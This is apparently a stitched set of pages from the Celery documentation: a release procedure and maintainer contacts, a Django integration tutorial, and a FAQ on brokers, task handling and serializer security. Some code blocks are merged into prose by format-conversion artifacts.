That's all that needs to be done, but remember that if your feature `` ` adds additional configuration options, then these needs to be documented in :file:`docs/configuration.rst`. Also, all settings need to be added to the :file:`celery/app/defaults.py` module.  Result backends require a separate section in the :file:`docs/configuration.rst` file.  .. _contact_information:  Contacts ========  This is a list of people that can be contacted for questions regarding the official git repositories, PyPI packages Read the Docs pages.  If the issue isn't an emergency then it's better to [report an issue <reporting-bugs>](#report-an-issue-<reporting-bugs>).   Committers ----------  Ask Solem ~~~~~~~~~  :github: https://github.com/ask :twitter: https://twitter.com/#!/asksol  Asif Saif Uddin ~~~~~~~~~~~~~~~  :github: https://github.com/auvipy :twitter: https://twitter.com/#!/auvipy  Dmitry Malinovsky ~~~~~~~~~~~~~~~~~  :github: https://github.com/malinoff :twitter: https://twitter.com/__malinoff__  Ionel Cristian Mărieș ~~~~~~~~~~~~~~~~~~~~~  :github: https://github.com/ionelmc :twitter: https://twitter.com/ionelmc  Mher Movsisyan ~~~~~~~~~~~~~~  :github: https://github.com/mher :twitter: https://twitter.com/#!/movsm  Omer Katz ~~~~~~~~~ :github: https://github.com/thedrow :twitter: https://twitter.com/the_drow  Steeve Morin ~~~~~~~~~~~~  :github: https://github.com/steeve :twitter: https://twitter.com/#!/steeve  Josue Balandrano Coronel ~~~~~~~~~~~~~~~~~~~~~~~~~  :github: https://github.com/xirdneh :twitter: https://twitter.com/eusoj_xirdneh  Tomer Nosrati ~~~~~~~~~~~~~ :github: https://github.com/Nusnus :twitter: https://x.com/tomer_nosrati  Website -------  The Celery Project website is run and maintained by  Mauro Rocco ~~~~~~~~~~~  :github: https://github.com/fireantology :twitter: https://twitter.com/#!/fireantology  with design by:  Jan Henrik Helmers ~~~~~~~~~~~~~~~~~~  :web: http://www.helmersworks.com :twitter: https://twitter.com/#!/helmers   .. _packages:  Packages ======== ``celery``----------  :git: https://github.com/celery/celery :CI: https://travis-ci.org/#!/celery/celery :Windows-CI: https://ci.appveyor.com/project/ask/celery :PyPI: :pypi:`celery` :docs: https://docs.celeryq.dev``kombu``---------  Messaging library.  :git: https://github.com/celery/kombu :CI: https://travis-ci.org/#!/celery/kombu :Windows-CI: https://ci.appveyor.com/project/ask/kombu :PyPI: :pypi:`kombu` :docs: https://kombu.readthedocs.io``amqp``--------  Python AMQP 0.9.1 client.  :git: https://github.com/celery/py-amqp :CI: https://travis-ci.org/#!/celery/py-amqp :Windows-CI: https://ci.appveyor.com/project/ask/py-amqp :PyPI: :pypi:`amqp` :docs: https://amqp.readthedocs.io``vine``--------  Promise/deferred implementation.  :git: https://github.com/celery/vine/ :CI: https://travis-ci.org/#!/celery/vine/ :Windows-CI: https://ci.appveyor.com/project/ask/vine :PyPI: :pypi:`vine` :docs: https://vine.readthedocs.io``pytest-celery``-----------------  Pytest plugin for Celery.  :git: https://github.com/celery/pytest-celery :PyPI: :pypi:`pytest-celery` :docs: https://pytest-celery.readthedocs.io``billiard`` ------------  Fork of multiprocessing containing improvements that'll eventually be merged into the Python stdlib.  :git: https://github.com/celery/billiard :CI: https://travis-ci.org/#!/celery/billiard/ :Windows-CI: https://ci.appveyor.com/project/ask/billiard :PyPI: :pypi:`billiard` ``django-celery-beat`` ----------------------  Database-backed Periodic Tasks with admin interface using the Django ORM.  :git: https://github.com/celery/django-celery-beat :CI: https://travis-ci.org/#!/celery/django-celery-beat :Windows-CI: https://ci.appveyor.com/project/ask/django-celery-beat :PyPI: :pypi:`django-celery-beat` ``django-celery-results`` -------------------------  Store task results in the Django ORM, or using the Django Cache Framework.  :git: https://github.com/celery/django-celery-results :CI: https://travis-ci.org/#!/celery/django-celery-results :Windows-CI: https://ci.appveyor.com/project/ask/django-celery-results :PyPI: :pypi:`django-celery-results` ``librabbitmq`` ---------------  Very fast Python AMQP client written in C.  :git: https://github.com/celery/librabbitmq :PyPI: :pypi:`librabbitmq` ``cell`` --------  Actor library.  :git: https://github.com/celery/cell :PyPI: :pypi:`cell` ``cyme``--------  Distributed Celery Instance manager.  :git: https://github.com/celery/cyme :PyPI: :pypi:`cyme` :docs: https://cyme.readthedocs.io/   Deprecated ----------  -``django-celery``:git: https://github.com/celery/django-celery :PyPI: :pypi:`django-celery` :docs: https://docs.celeryq.dev/en/latest/django  -``Flask-Celery``:git: https://github.com/ask/Flask-Celery :PyPI: :pypi:`Flask-Celery`  -``celerymon``:git: https://github.com/celery/celerymon :PyPI: :pypi:`celerymon`  -``carrot``:git: https://github.com/ask/carrot :PyPI: :pypi:`carrot`  -``ghettoq``:git: https://github.com/ask/ghettoq :PyPI: :pypi:`ghettoq`  -``kombu-sqlalchemy``:git: https://github.com/ask/kombu-sqlalchemy :PyPI: :pypi:`kombu-sqlalchemy`  -``django-kombu``:git: https://github.com/ask/django-kombu :PyPI: :pypi:`django-kombu`  -``pylibrabbitmq``Old name for :pypi:`librabbitmq`.  :git: `None` :PyPI: :pypi:`pylibrabbitmq`  .. _release-procedure:   Release Procedure =================  Updating the version number ---------------------------  The version number must be updated in three places:      * :file:`celery/__init__.py`     * :file:`docs/include/introduction.txt`     * :file:`README.rst`  The changes to the previous files can be handled with the [`bumpversion` command line tool] (https://pypi.org/project/bumpversion/). The corresponding configuration lives in :file:`.bumpversion.cfg`. To do the necessary changes, run:``\`console $ bumpversion

After you have changed these files, you must render `` ` the :file:`README` files. There's a script to convert sphinx syntax to generic reStructured Text syntax, and the make target `readme` does this for you: ``\`console $ make readme

Now commit the changes:

``` console
$ git commit -a -m "Bumps version to X.Y.Z"
```

and make a new version tag:

``` console
$ git tag vX.Y.Z
$ git push --tags
```

Releasing `` ` ---------  Commands to make a new public stable release: ``\`console $ make distcheck \# checks pep8, autodoc index, runs tests and more $ make dist \# NOTE: Runs git clean -xdf and removes files not in the repo. $ python setup.py sdist upload --sign --identity='Celery Security Team' $ python setup.py bdist\_wheel upload --sign --identity='Celery Security Team'

If this is a new release series then you also need to do the `` ` following:  * Go to the Read The Docs management interface at:     https://readthedocs.org/projects/celery/?fromdocs=celery  * Enter "Edit project"      Change default branch to the branch of this series, for example, use     the ``2.4\`\` branch for the 2.4 series.

  - Also add the previous version under the "versions" tab.

---

copyright.md

---

# Copyright

*Celery User Manual*

by Ask Solem

Copyright © 2009-2016, Ask Solem.

All rights reserved. This material may be copied or distributed only subject to the terms and conditions set forth in the <span class="title-ref">Creative Commons Attribution-ShareAlike 4.0 International</span> \<<https://creativecommons.org/licenses/by-sa/4.0/legalcode>\>\`\_ license.

You may share and adapt the material, even for commercial purposes, but you must give the original author credit. If you alter, transform, or build upon this work, you may distribute the resulting work only under the same license or a license compatible to this one.

\> **Note** \> While the *Celery* documentation is offered under the Creative Commons *Attribution-ShareAlike 4.0 International* license the Celery *software* is offered under the [BSD License (3 Clause)](http://www.opensource.org/licenses/BSD-3-Clause)

---

first-steps-with-django.md

---

# First steps with Django

## Using Celery with Django

\> **Note** \> Previous versions of Celery required a separate library to work with Django, but since 3.1 this is no longer the case. Django is supported out of the box now so this document only contains a basic way to integrate Celery and Django. You'll use the same API as non-Django users so you're recommended to read the \[first-steps\](\#first-steps) tutorial first and come back to this tutorial. When you have a working example you can continue to the \[next-steps\](\#next-steps) guide.

<div class="note">

<div class="title">

Note

</div>

Celery 5.5.x supports Django 2.2 LTS or newer versions. Please use Celery 5.2.x for versions older than Django 2.2 or Celery 4.4.x if your Django version is older than 1.11.

</div>

To use Celery with your Django project you must first define an instance of the Celery library (called an "app")

If you have a modern Django project layout like:

    - proj/
      - manage.py
      - proj/
        - __init__.py
        - settings.py
        - urls.py

then the recommended way is to create a new <span class="title-ref">proj/proj/celery.py</span> module that defines the Celery instance:

  - file  
    <span class="title-ref">proj/proj/celery.py</span>

<div class="literalinclude">

../../examples/django/proj/celery.py

</div>

Then you need to import this app in your `proj/proj/__init__.py` module. This ensures that the app is loaded when Django starts so that the `@shared_task` decorator (mentioned later) will use it:

`proj/proj/__init__.py`:

<div class="literalinclude">

../../examples/django/proj/\_\_init\_\_.py

</div>

Note that this example project layout is suitable for larger projects, for simple projects you may use a single contained module that defines both the app and tasks, like in the \[tut-celery\](\#tut-celery) tutorial.

Let's break down what happens in the first module, first, we set the default `DJANGO_SETTINGS_MODULE` environment variable for the `celery` command-line program:

`` `python     os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'proj.settings')  You don't need this line, but it saves you from always passing in the ``<span class="title-ref"> settings module to the </span><span class="title-ref">celery</span>\` program. It must always come before creating the app instances, as is what we do next:

`` `python     app = Celery('proj')  This is our instance of the library, you can have many instances ``\` but there's probably no reason for that when using Django.

We also add the Django settings module as a configuration source for Celery. This means that you don't have to use multiple configuration files, and instead configure Celery directly from the Django settings; but you can also separate them if wanted.

`` `python     app.config_from_object('django.conf:settings', namespace='CELERY')  The uppercase name-space means that all ``<span class="title-ref"> \[Celery configuration options \<configuration\>\](\#celery-configuration-options-\<configuration\>) must be specified in uppercase instead of lowercase, and start with </span><span class="title-ref">CELERY\_</span><span class="title-ref">, so for example the :setting:\`task\_always\_eager</span> setting becomes `CELERY_TASK_ALWAYS_EAGER`, and the `broker_url` setting becomes `CELERY_BROKER_URL`. This also applies to the workers settings, for instance, the `worker_concurrency` setting becomes `CELERY_WORKER_CONCURRENCY`.

For example, a Django project's configuration file might include:

``` python
...

# Celery Configuration Options
CELERY_TIMEZONE = "Australia/Tasmania"
CELERY_TASK_TRACK_STARTED = True
CELERY_TASK_TIME_LIMIT = 30 * 60
```

You can pass the settings object directly instead, but using a string is better since then the worker doesn't have to serialize the object. The `CELERY_` namespace is also optional, but recommended (to prevent overlap with other Django settings).

Next, a common practice for reusable apps is to define all tasks in a separate `tasks.py` module, and Celery does have a way to auto-discover these modules:

`` `python     app.autodiscover_tasks()  With the line above Celery will automatically discover tasks from all ``<span class="title-ref"> of your installed apps, following the </span><span class="title-ref">tasks.py</span>\` convention:

    - app1/
        - tasks.py
        - models.py
    - app2/
        - tasks.py
        - models.py

This way you don't have to manually add the individual modules to the `CELERY_IMPORTS <imports>` setting.

Finally, the `debug_task` example is a task that dumps its own request information. This is using the new `bind=True` task option introduced in Celery 3.1 to easily refer to the current task instance.

### Using the `@shared_task` decorator

The tasks you write will probably live in reusable apps, and reusable apps cannot depend on the project itself, so you also cannot import your app instance directly.

The `@shared_task` decorator lets you create tasks without having any concrete app instance:

`demoapp/tasks.py`:

<div class="literalinclude">

../../examples/django/demoapp/tasks.py

</div>

<div class="seealso">

You can find the full source code for the Django example project at: <https://github.com/celery/celery/tree/main/examples/django/>

</div>

### Trigger tasks at the end of the database transaction

A common pitfall with Django is triggering a task immediately and not wait until the end of the database transaction, which means that the Celery task may run before all changes are persisted to the database. For example:

`` `python     # views.py     def create_user(request):         # Note: simplified example, use a form to validate input         user = User.objects.create(username=request.POST['username'])         send_email.delay(user.pk)         return HttpResponse('User created')      # task.py     @shared_task     def send_email(user_pk):         user = User.objects.get(pk=user_pk)         # send email ...  In this case, the ``send\_email`task could start before the view has committed`\` the transaction to the database, and therefore the task may not be able to find the user.

A common solution is to use Django's [on\_commit](https://docs.djangoproject.com/en/stable/topics/db/transactions/#django.db.transaction.on_commit) hook to trigger the task after the transaction has been committed:

`` `diff     - send_email.delay(user.pk)     + transaction.on_commit(lambda: send_email.delay(user.pk))  .. versionadded:: 5.4  Since this is such a common pattern, Celery 5.4 introduced a handy shortcut for this, ``<span class="title-ref"> using a </span>\~celery.contrib.django.task.DjangoTask\`. Instead of calling <span class="title-ref">\~celery.app.task.Task.delay</span>, you should call \`\~celery.contrib.django.task.DjangoTask.delay\_on\_commit\`:

`` `diff     - send_email.delay(user.pk)     + send_email.delay_on_commit(user.pk)   This API takes care of wrapping the call into the `on_commit`_ hook for you. ``<span class="title-ref"> In rare cases where you want to trigger a task without waiting, the existing </span>\~celery.app.task.Task.delay\` API is still available.

One key difference compared to the `delay` method, is that `delay_on_commit` will NOT return the task ID back to the caller. The task is not sent to the broker when you call the method, only when the Django transaction finishes. If you need the task ID, best to stick to <span class="title-ref">\~celery.app.task.Task.delay</span>.

This task class should be used automatically if you've follow the setup steps above. However, if your app \[uses a custom task base class \<task-custom-classes\>\](\#uses-a-custom-task-base-class-\<task-custom-classes\>), you'll need inherit from <span class="title-ref">\~celery.contrib.django.task.DjangoTask</span> instead of <span class="title-ref">\~celery.app.task.Task</span> to get this behaviour.

## Extensions

### `django-celery-results` - Using the Django ORM/Cache as a result backend

The `django-celery-results` extension provides result backends using either the Django ORM, or the Django Cache framework.

To use this with your project you need to follow these steps:

1.  Install the `django-celery-results` library:
    
    >   - \`\`\`console  
    >     $ pip install django-celery-results

2.  Add `django_celery_results` to `INSTALLED_APPS` in your Django project's `settings.py`:
    
        INSTALLED_APPS = (
            ...,
            'django_celery_results',
        )
    
    Note that there is no dash in the module name, only underscores.

3.  Create the Celery database tables by performing a database migrations:
    
    > 
    > 
    > ``` console
    > $ python manage.py migrate django_celery_results
    > ```

4.  Configure Celery to use the `django-celery-results` backend.
    
    > Assuming you are using Django's `settings.py` to also configure Celery, add the following settings:
    > 
    > ``` python
    > CELERY_RESULT_BACKEND = 'django-db'
    > ```
    > 
    > When using the cache backend, you can specify a cache defined within Django's CACHES setting.
    > 
    > ``` python
    > CELERY_RESULT_BACKEND = 'django-cache'
    > 
    > # pick which cache from the CACHES setting.
    > CELERY_CACHE_BACKEND = 'default'
    > 
    > # django setting.
    > CACHES = {
    >     'default': {
    >         'BACKEND': 'django.core.cache.backends.db.DatabaseCache',
    >         'LOCATION': 'my_cache_table',
    >     }
    > }
    > ```
    > 
    > For additional configuration options, view the \[conf-result-backend\](\#conf-result-backend) reference.

`django-celery-beat` - Database-backed Periodic Tasks with Admin interface. `` ` -----------------------------------------------------------------------------  See [beat-custom-schedulers](#beat-custom-schedulers) for more information.  Starting the worker process ===========================  In a production environment you'll want to run the worker in the background as a daemon - see [daemonizing](#daemonizing) - but for testing and development it is useful to be able to start a worker instance by using the :program:`celery worker` manage command, much as you'd use Django's :command:`manage.py runserver`: ``\`console $ celery -A proj worker -l INFO

For a complete listing of the command-line options available, `` ` use the help command: ``\`console $ celery --help

Where to go from here \`\`\` =====================

If you want to learn more you should continue to the \[Next Steps \<next-steps\>\](\#next-steps-\<next-steps\>) tutorial, and after that you can study the \[User Guide \<guide\>\](\#user-guide-\<guide\>).

---

index.md

---

# Django

  - Release  

  - Date  

<div class="toctree" data-maxdepth="2">

first-steps-with-django

</div>

---

faq.md

---

# Frequently Asked Questions

<div class="contents" data-local="">

</div>

## General

### What kinds of things should I use Celery for?

**Answer:** [Queue everything and delight everyone](https://decafbad.com/blog/2008/07/04/queue-everything-and-delight-everyone) is a good article describing why you'd use a queue in a web context.

These are some common use cases:

  - Running something in the background. For example, to finish the web request as soon as possible, then update the users page incrementally. This gives the user the impression of good performance and "snappiness", even though the real work might actually take some time.
  - Running something after the web request has finished.
  - Making sure something is done, by executing it asynchronously and using retries.
  - Scheduling periodic work.

And to some degree:

  - Distributed computing.
  - Parallel execution.

## Misconceptions

### Does Celery really consist of 50.000 lines of code?

**Answer:** No, this and similarly large numbers have been reported at various locations.

The numbers as of this writing are:

>   - core: 7,141 lines of code.
>   - tests: 14,209 lines.
>   - backends, contrib, compat utilities: 9,032 lines.

Lines of code isn't a useful metric, so even if Celery did consist of 50k lines of code you wouldn't be able to draw any conclusions from such a number.

### Does Celery have many dependencies?

A common criticism is that Celery uses too many dependencies. The rationale behind such a fear is hard to imagine, especially considering code reuse as the established way to combat complexity in modern software development, and that the cost of adding dependencies is very low now that package managers like pip and PyPI makes the hassle of installing and maintaining dependencies a thing of the past.

Celery has replaced several dependencies along the way, and the current list of dependencies are:

#### celery

  - `kombu`

Kombu is part of the Celery ecosystem and is the library used to send and receive messages. It's also the library that enables us to support many different message brokers. It's also used by the OpenStack project, and many others, validating the choice to separate it from the Celery code-base.

  - `billiard`

Billiard is a fork of the Python multiprocessing module containing many performance and stability improvements. It's an eventual goal that these improvements will be merged back into Python one day.

It's also used for compatibility with older Python versions that don't come with the multiprocessing module.

#### kombu

Kombu depends on the following packages:

  - `amqp`

The underlying pure-Python amqp client implementation. AMQP being the default broker this is a natural dependency.

\> **Note** \> To handle the dependencies for popular configuration choices Celery defines a number of "bundle" packages, see \[bundles\](\#bundles).

### Is Celery heavy-weight?

Celery poses very little overhead both in memory footprint and performance.

But please note that the default configuration isn't optimized for time nor space, see the \[guide-optimizing\](\#guide-optimizing) guide for more information.

### Is Celery dependent on pickle?

**Answer:** No, Celery can support any serialization scheme.

We have built-in support for JSON, YAML, Pickle, and msgpack. Every task is associated with a content type, so you can even send one task using pickle, another using JSON.

The default serialization support used to be pickle, but since 4.0 the default is now JSON. If you require sending complex Python objects as task arguments, you can use pickle as the serialization format, but see notes in \[security-serializers\](\#security-serializers).

If you need to communicate with other languages you should use a serialization format suited to that task, which pretty much means any serializer that's not pickle.

You can set a global default serializer, the default serializer for a particular Task, or even what serializer to use when sending a single task instance.

### Is Celery for Django only?

**Answer:** No, you can use Celery with any framework, web or otherwise.

### Do I have to use AMQP/RabbitMQ?

**Answer**: No, although using RabbitMQ is recommended you can also use Redis, SQS, or Qpid.

See \[brokers\](\#brokers) for more information.

Redis as a broker won't perform as well as an AMQP broker, but the combination RabbitMQ as broker and Redis as a result store is commonly used. If you have strict reliability requirements you're encouraged to use RabbitMQ or another AMQP broker. Some transports also use polling, so they're likely to consume more resources. However, if you for some reason aren't able to use AMQP, feel free to use these alternatives. They will probably work fine for most use cases, and note that the above points are not specific to Celery; If using Redis/database as a queue worked fine for you before, it probably will now. You can always upgrade later if you need to.

### Is Celery multilingual?

**Answer:** Yes.

`~celery.bin.worker` is an implementation of Celery in Python. If the language has an AMQP client, there shouldn't be much work to create a worker in your language. A Celery worker is just a program connecting to the broker to process messages.

Also, there's another way to be language-independent, and that's to use REST tasks, instead of your tasks being functions, they're URLs. With this information you can even create simple web servers that enable preloading of code. Simply expose an endpoint that performs an operation, and create a task that just performs an HTTP request to that endpoint.

You can also use [Flower's](https://flower.readthedocs.io) [REST API](https://flower.readthedocs.io/en/latest/api.html#post--api-task-async-apply-\(.+\)) to invoke tasks.

## Troubleshooting

### MySQL is throwing deadlock errors, what can I do?

**Answer:** MySQL has default isolation level set to <span class="title-ref">REPEATABLE-READ</span>, if you don't really need that, set it to <span class="title-ref">READ-COMMITTED</span>. You can do that by adding the following to your `my.cnf`:

    [mysqld]
    transaction-isolation = READ-COMMITTED

For more information about InnoDB’s transaction model see [MySQL - The InnoDB Transaction Model and Locking](https://dev.mysql.com/doc/refman/5.1/en/innodb-transaction-model.html) in the MySQL user manual.

(Thanks to Honza Kral and Anton Tsigularov for this solution)

### The worker isn't doing anything, just hanging

**Answer:** See [MySQL is throwing deadlock errors, what can I do?](#mysql-is-throwing-deadlock-errors-what-can-i-do), or [Why is Task.delay/apply\\\*/the worker just hanging?]().

### Task results aren't reliably returning

**Answer:** If you're using the database backend for results, and in particular using MySQL, see [MySQL is throwing deadlock errors, what can I do?](#mysql-is-throwing-deadlock-errors-what-can-i-do).

### Why is Task.delay/apply\*/the worker just hanging?

**Answer:** There's a bug in some AMQP clients that'll make it hang if it's not able to authenticate the current user, the password doesn't match or the user doesn't have access to the virtual host specified. Be sure to check your broker logs (for RabbitMQ that's `/var/log/rabbitmq/rabbit.log` on most systems), it usually contains a message describing the reason.

### Does it work on FreeBSD?

**Answer:** Depends;

When using the RabbitMQ (AMQP) and Redis transports it should work out of the box.

For other transports the compatibility prefork pool is used and requires a working POSIX semaphore implementation, this is enabled in FreeBSD by default since FreeBSD 8.x. For older version of FreeBSD, you have to enable POSIX semaphores in the kernel and manually recompile billiard.

Luckily, Viktor Petersson has written a tutorial to get you started with Celery on FreeBSD here: <http://www.playingwithwire.com/2009/10/how-to-get-celeryd-to-work-on-freebsd/>

### I'm having <span class="title-ref">IntegrityError: Duplicate Key</span> errors. Why?

**Answer:** See [MySQL is throwing deadlock errors, what can I do?](#mysql-is-throwing-deadlock-errors-what-can-i-do). Thanks to :github\_user:<span class="title-ref">@howsthedotcom</span>.

### Why aren't my tasks processed?

**Answer:** With RabbitMQ you can see how many consumers are currently receiving tasks by running the following command:

`` `console     $ rabbitmqctl list_queues -p <myvhost> name messages consumers     Listing queues ...     celery     2891    2  This shows that there's 2891 messages waiting to be processed in the task ``\` queue, and there are two consumers processing them.

One reason that the queue is never emptied could be that you have a stale worker process taking the messages hostage. This could happen if the worker wasn't properly shut down.

When a message is received by a worker the broker waits for it to be acknowledged before marking the message as processed. The broker won't re-send that message to another consumer until the consumer is shut down properly.

If you hit this problem you have to kill all workers manually and restart them:

`` `console     $ pkill 'celery worker'      $ # - If you don't have pkill use:     $ # ps auxww | awk '/celery worker/ {print $2}' | xargs kill  You may have to wait a while until all workers have finished executing ``\` tasks. If it's still hanging after a long time you can kill them by force with:

`` `console     $ pkill -9 'celery worker'      $ # - If you don't have pkill use:     $ # ps auxww | awk '/celery worker/ {print $2}' | xargs kill -9  .. _faq-task-does-not-run:  Why won't my Task run? ``\` ----------------------

**Answer:** There might be syntax errors preventing the tasks module being imported.

You can find out if Celery is able to run the task by executing the task manually:

`` `python     >>> from myapp.tasks import MyPeriodicTask     >>> MyPeriodicTask.delay()  Watch the workers log file to see if it's able to find the task, or if some ``\` other error is happening.

### Why won't my periodic task run?

**Answer:** See [Why won't my Task run?]().

### How do I purge all waiting tasks?

**Answer:** You can use the `celery purge` command to purge all configured task queues:

`` `console     $ celery -A proj purge  or programmatically:  .. code-block:: pycon      >>> from proj.celery import app     >>> app.control.purge()     1753  If you only want to purge messages from a specific queue ``<span class="title-ref"> you have to use the AMQP API or the :program:\`celery amqp</span> utility:

`` `console     $ celery -A proj amqp queue.purge <queue name>  The number 1753 is the number of messages deleted.  You can also start the worker with the ``<span class="title-ref"> :option:</span>--purge \<celery worker --purge\>\` option enabled to purge messages when the worker starts.

### I've purged messages, but there are still messages left in the queue?

**Answer:** Tasks are acknowledged (removed from the queue) as soon as they're actually executed. After the worker has received a task, it will take some time until it's actually executed, especially if there are a lot of tasks already waiting for execution. Messages that aren't acknowledged are held on to by the worker until it closes the connection to the broker (AMQP server). When that connection is closed (e.g., because the worker was stopped) the tasks will be re-sent by the broker to the next available worker (or the same worker when it has been restarted), so to properly purge the queue of waiting tasks you have to stop all the workers, and then purge the tasks using <span class="title-ref">celery.control.purge</span>.

## Results

### How do I get the result of a task if I have the ID that points there?

**Answer**: Use \`task.AsyncResult\`:

`` `pycon     >>> result = my_task.AsyncResult(task_id)     >>> result.get()  This will give you a `~celery.result.AsyncResult` instance ``\` using the tasks current result backend.

If you need to specify a custom result backend, or you want to use the current application's default backend you can use \`@AsyncResult\`:

`` `pycon     >>> result = app.AsyncResult(task_id)     >>> result.get()  .. _faq-security:  Security ``\` ========

### Isn't using <span class="title-ref">pickle</span> a security concern?

**Answer**: Indeed, since Celery 4.0 the default serializer is now JSON to make sure people are choosing serializers consciously and aware of this concern.

It's essential that you protect against unauthorized access to your broker, databases and other services transmitting pickled data.

Note that this isn't just something you should be aware of with Celery, for example also Django uses pickle for its cache client.

For the task messages you can set the `task_serializer` setting to "json" or "yaml" instead of pickle.

Similarly for task results you can set `result_serializer`.

For more details of the formats used and the lookup order when checking what format to use for a task see \[calling-serializers\](\#calling-serializers)

### Can messages be encrypted?

**Answer**: Some AMQP brokers supports using SSL (including RabbitMQ). You can enable this using the `broker_use_ssl` setting.

It's also possible to add additional encryption and security to messages, if you have a need for this then you should contact the \[mailing-list\](\#mailing-list).

### Is it safe to run `celery worker` as root?

**Answer**: No\!

We're not currently aware of any security issues, but it would be incredibly naive to assume that they don't exist, so running the Celery services (`celery worker`, `celery beat`, `celeryev`, etc) as an unprivileged user is recommended.

## Brokers

### Why is RabbitMQ crashing?

**Answer:** RabbitMQ will crash if it runs out of memory. This will be fixed in a future release of RabbitMQ. please refer to the RabbitMQ FAQ: <https://www.rabbitmq.com/faq.html#node-runs-out-of-memory>

\> **Note** \> This is no longer the case, RabbitMQ versions 2.0 and above includes a new persister, that's tolerant to out of memory errors. RabbitMQ 2.1 or higher is recommended for Celery.

> If you're still running an older version of RabbitMQ and experience crashes, then please upgrade\!

Misconfiguration of Celery can eventually lead to a crash on older version of RabbitMQ. Even if it doesn't crash, this can still consume a lot of resources, so it's important that you're aware of the common pitfalls.

  - Events.

Running `~celery.bin.worker` with the `-E <celery worker -E>` option will send messages for events happening inside of the worker.

Events should only be enabled if you have an active monitor consuming them, or if you purge the event queue periodically.

  - AMQP backend results.

When running with the AMQP result backend, every task result will be sent as a message. If you don't collect these results, they will build up and RabbitMQ will eventually run out of memory.

This result backend is now deprecated so you shouldn't be using it. Use either the RPC backend for rpc-style calls, or a persistent backend if you need multi-consumer access to results.

Results expire after 1 day by default. It may be a good idea to lower this value by configuring the `result_expires` setting.

If you don't use the results for a task, make sure you set the <span class="title-ref">ignore\_result</span> option:

`` `python     @app.task(ignore_result=True)     def mytask():         pass      class MyTask(Task):         ignore_result = True  .. _faq-use-celery-with-stomp:  Can I use Celery with ActiveMQ/STOMP? ``\` -------------------------------------

**Answer**: No. It used to be supported by `Carrot` (our old messaging library) but isn't currently supported in `Kombu` (our new messaging library).

### What features aren't supported when not using an AMQP broker?

This is an incomplete list of features not available when using the virtual transports:

>   - Remote control commands (supported only by Redis).
> 
>   - Monitoring with events may not work in all virtual transports.
> 
>   -   - The <span class="title-ref">header</span> and <span class="title-ref">fanout</span> exchange types  
>         (<span class="title-ref">fanout</span> is supported by Redis).

## Tasks

### How can I reuse the same connection when calling tasks?

**Answer**: See the `broker_pool_limit` setting. The connection pool is enabled by default since version 2.5.

### `sudo` in a `subprocess` returns <span class="title-ref">None</span>

There's a `sudo` configuration option that makes it illegal for process without a tty to run `sudo`:

`` `text     Defaults requiretty  If you have this configuration in your :file:`/etc/sudoers` file then ``<span class="title-ref"> tasks won't be able to call :command:\`sudo</span> when the worker is running as a daemon. If you want to enable that, then you need to remove the line from `/etc/sudoers`.

See: <http://timelordz.com/wiki/Apache_Sudo_Commands>

### Why do workers delete tasks from the queue if they're unable to process them?

**Answer**:

The worker rejects unknown tasks, messages with encoding errors and messages that don't contain the proper fields (as per the task message protocol).

If it didn't reject them they could be redelivered again and again, causing a loop.

Recent versions of RabbitMQ has the ability to configure a dead-letter queue for exchange, so that rejected messages is moved there.

### Can I call a task by name?

**Answer**: Yes, use <span class="title-ref">@send\_task</span>.

You can also call a task by name, from any language, using an AMQP client:

`` `python     >>> app.send_task('tasks.add', args=[2, 2], kwargs={})     <AsyncResult: 373550e8-b9a0-4666-bc61-ace01fa4f91d>  To use ``chain`,`chord`or`group`with tasks called by name,`<span class="title-ref"> use the </span>@Celery.signature\` method:

`` `python     >>> chain(     ...     app.signature('tasks.add', args=[2, 2], kwargs={}),     ...     app.signature('tasks.add', args=[1, 1], kwargs={})     ... ).apply_async()     <AsyncResult: e9d52312-c161-46f0-9013-2713e6df812d>  .. _faq-get-current-task-id:  Can I get the task id of the current task? ``\` ----------------------------------------------

**Answer**: Yes, the current id and more is available in the task request:

    @app.task(bind=True)
    def mytask(self):
        cache.set(self.request.id, "Running")

For more information see \[task-request-info\](\#task-request-info).

If you don't have a reference to the task instance you can use \`app.current\_task \<@current\_task\>\`:

`` `python     >>> app.current_task.request.id  But note that this will be any task, be it one executed by the worker, or a ``\` task called directly by that task, or a task called eagerly.

To get the current task being worked on specifically, use \`app.current\_worker\_task \<@current\_worker\_task\>\`:

`` `python     >>> app.current_worker_task.request.id  > **Note** >      Both `~@current_task`, and `~@current_worker_task` can be     `None`.  .. _faq-custom-task-ids:  Can I specify a custom task_id? ``\` -------------------------------

**Answer**: Yes, use the <span class="title-ref">task\_id</span> argument to \`Task.apply\_async\`:

`` `pycon     >>> task.apply_async(args, kwargs, task_id='…')   Can I use decorators with tasks? ``\` --------------------------------

**Answer**: Yes, but please see note in the sidebar at \[task-basics\](\#task-basics).

### Can I use natural task ids?

**Answer**: Yes, but make sure it's unique, as the behavior for two tasks existing with the same id is undefined.

The world will probably not explode, but they can definitely overwrite each others results.

### Can I run a task once another task has finished?

**Answer**: Yes, you can safely launch a task inside a task.

A common pattern is to add callbacks to tasks:

`` `python     from celery.utils.log import get_task_logger      logger = get_task_logger(__name__)      @app.task     def add(x, y):         return x + y      @app.task(ignore_result=True)     def log_result(result):         logger.info("log_result got: %r", result)  Invocation:  .. code-block:: pycon      >>> (add.s(2, 2) | log_result.s()).delay()  See [userguide/canvas](userguide/canvas.md) for more information.  .. _faq-cancel-task:  Can I cancel the execution of a task? ``\` -------------------------------------**Answer**: Yes, Use \`result.revoke() \<celery.result.AsyncResult.revoke\>\`:

`` `pycon     >>> result = add.apply_async(args=[2, 2], countdown=120)     >>> result.revoke()  or if you only have the task id:  .. code-block:: pycon      >>> from proj.celery import app     >>> app.control.revoke(task_id)   The latter also support passing a list of task-ids as argument.  .. _faq-node-not-receiving-broadcast-commands:  Why aren't my remote control commands received by all workers? ``\` --------------------------------------------------------------

**Answer**: To receive broadcast remote control commands, every worker node creates a unique queue name, based on the nodename of the worker.

If you have more than one worker with the same host name, the control commands will be received in round-robin between them.

To work around this you can explicitly set the nodename for every worker using the `-n <celery worker -n>` argument to `~celery.bin.worker`:

`` `console     $ celery -A proj worker -n worker1@%h     $ celery -A proj worker -n worker2@%h  where ``%h`expands into the current hostname.  .. _faq-task-routing:  Can I send some tasks to only some servers?`\` --------------------------------------------

**Answer:** Yes, you can route tasks to one or more workers, using different message routing topologies, and a worker instance can bind to multiple queues.

See \[userguide/routing\](userguide/routing.md) for more information.

### Can I disable prefetching of tasks?

**Answer**: Maybe\! The AMQP term "prefetch" is confusing, as it's only used to describe the task prefetching *limit*. There's no actual prefetching involved.

Disabling the prefetch limits is possible, but that means the worker will consume as many tasks as it can, as fast as possible.

